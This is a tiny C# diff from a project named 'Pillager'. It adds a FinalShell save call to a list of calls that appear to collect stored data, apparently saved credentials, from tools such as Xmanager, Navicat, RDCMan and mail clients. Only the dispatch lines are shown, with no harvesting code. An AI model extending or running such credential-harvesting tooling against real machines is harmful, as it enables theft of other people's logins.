@@ -36,6 +36,7 @@ namespace Pillager
             Xmanager.Save(savepath);
             Navicat.Save(savepath);
             RDCMan.Save(savepath);
+            FinalShell.Save(savepath);
 
             //Mail
             MailMaster.Save(savepath);
